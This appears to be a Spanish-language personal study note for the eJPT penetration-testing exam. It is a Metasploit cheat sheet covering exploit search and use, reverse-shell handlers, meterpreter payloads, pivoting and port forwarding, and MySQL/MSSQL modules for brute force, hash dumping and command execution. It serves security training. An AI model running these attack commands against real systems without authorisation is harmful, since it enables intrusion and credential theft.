# Metasploit

Propietario: Adrian Gisbert Cabello

Ejecutar metasploit examen eJPT: `service postgresql start && msfconsole`

- Comandos para usar en metasploit:
    - Para abrir metasploit: `msfconsole`
    - Para buscar un exploit: `search NOMBRE DE LA VULNERABILIDAD`
    - Para usar un exploit una vez que tenemos el listado: `use 0`	(cambiar el 0 por el número del exploit que queramos escoger)
    - Para ver las opciones que tiene el script seleccionado: `show options`
    - Para setear las opciones:	`set XXXX`(por ejemplo set LHOST, RHOST, LPORT, RPORT etc.)
    - Para usar un exploit manualmente en nuestra terminal sin usar msfconsole:		***searchsploit <nombre de la vulnerabilidad>***  (`searchsploit sftpd 2.3.4`)		→		***searchsploit -m <número del .py>*** (`searchsploit -m 49757`) → una vez descargado en nuestro directorio podemos hacer un ***nano*** del archivo.py para ver las instrucciones y ejecutarlo con los argumentos que nos pida (`python3 49757.py 1234`). Si solo queremos ver el archivo usar `searchsploit -x 49757`
    - Para logearse a través de la consola de  metasploit: `search ssh_login` | `search mysql_login`
    - Para ver las sesiones creadas una vez logeados: `sessions`
    - Para entrar dentro de una sesión: `sessions 1`(cambiar el número por la sesión a la que queramos entrar) para salir de la sesión pulsamos simultáneamente ***CTRL + Z***
    - Cerrar una sesión de metasploit: `sessions -k 1`(cambiar el número por la sesión que queramos cerrar)
    - Para upgradear una sesión en metasploit y pasarla a meterpreter: `sessions -u 1` ******(cambiar el número por la sesión a la que queramos upgradear)		normalmente se puede elevar si entramos a una sesión con usuarios con permisos de admin
    - Para saber la route_table (direcciones de subredes que hayamos configurado): `route print` o también  `route`
    - Para buscar vulnerabilidades usar el comando ***searchsploit*** <NOMBRE DE LA VULNERABILIDAD> `searchsploit openssh 7.2`
    - Para mediante una reverse shell conectarse a través de metasploit y luego poder upgradear a una sesión meterpreter, primero nos ponemos en modo escucha en metasploit con `use multi/handler`, ponemos el LHOST y LPORT y le damos a `run`. Una vez estamos en escucha, activamos la reverse shell en la máquina víctima y ya tendremos una sesión normal.
    
    Podemos usar un payload para windows: `set payload windows/meterpreter/reverse_tcp` | `set payload linux/x64/meterpreter/reverse_tcp`
    
    Ahora podemos hacer 2 cosas para levear la sesión a una sesión meterpreter:
    
    1. `sessions -u 1` (tenemos que cambiar el 1 por el número de la sesión que queramnos levear)
    
    2. `use shell_to_meterpreter`, ponemos el LHOST, LPORT y la SESSION. (una vez rellenados los datos le damos a `run` y se nos creará una nueva sesión meterpreter)
    
    Para añadir una ip a la tabla de rutas de nuestra máquina atacante y poder ver otros equipos en esas subredes podemos hacerlo de 3 maneras:
    
    1. `use multi/manage/autoroute ----- show options ----- set SESSION X`
    
    2. `run autoroute -s 192.168.X.0/24` ******(aquí pondremos la nueva ip encontrada y su máscara de red, en este caso es /24 porque era 255.255.255.0)
    
    3. Para añadir un segmento de red en meterpreter: `route add 192.168.X.0/24 2` (añadimos la ruta a la sesión 2)
    
    - Para visualizar la tabla de rutas: `route`
    - Para eliminar una ruta en la tabla de rutas: `route del 192.168.X.0/24 2` (borramos una ruta en la sesión 2)
    - Para hacer escaneo de puertos en msfconsole: `use auxiliary/scanner/portscan/tcp` → `show options`	→ `set rhost <ip del equipo en la subred>` → `set ports 1-65000` (si queremos menos puertos y más rápido, p.ej: 1-1000)
    - Para hacer un port_forwarding en meterpreter: `portfwd add -l 2233 -p 445 -r 192.168.224.X`	(significa que por nuestro puerto 2233 de la máquina atacante, veremos el puerto 445 de la máquina víctima
    - Para listar los puertos que hemos hecho port_forwarding: `portfwd list`
        
        Ahora podemos hacer un escaneo en nmap desde el terminal al puerto que hemos añadido: `nmap -p2233 [localhost](http://localhost)` o un escaneo más exaustivo `nmap -sSCV -p2233 localhost`
        

- Escaners en Metasploit para MySQL:
    
    Para ver directorios con permisos de escritura: `use auxiliary/scanner/mysql/mysql_writable_dirs`
    
    `set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt`
    
    `set verbose false`
    
    `set password ''`
    
    `run`
    
    Para dumpear hashes: `use auxiliary/scanner/mysql/mysql_hashdump`
    
    `set username root`
    
    `set password ''`
    
    `exploit`
    

- Con la herramienta metasploit podemos usar los siguientes scripts:
    - Fuerza bruta: `use auxiliary/scanner/mssql/mssql_login`
    - Enumeración en mysql: `use auxiliary/admin/mssql/mssql_enum`
    - Dumpear hashes: `use auxiliary/scanner/mssql/mssql_hashdump`
    - Para saber que privilegios tienen los usuarios: `use auxiliary/admin/mssql/mssql_enum_sql_logins`
    - Para enumerar dominios: `use auxiliary/admin/mssql/mssql_enum_domain_accounts`
    - Ejecución remota de comandos (RCE) con credenciales: `use auxiliary/admin/mssql/mssql_enum_exec`
    
    `set cmd whoami`
    

Exploit para webdav:

`search iis upload`

`use exploit/windows/iis/iis_webdav_upload_asp`

Especificar HttpPassword y HttpUsername del webdav server

[Meterpreter](Metasploit%208f767f4ca730444a8b8922b0263baef1/Meterpreter%203147b7c940a448a499a91d9abe6faf80.md)

[Msfvenom](Metasploit%208f767f4ca730444a8b8922b0263baef1/Msfvenom%2004d305aac65f49f2b66c33cf3de953f5.md)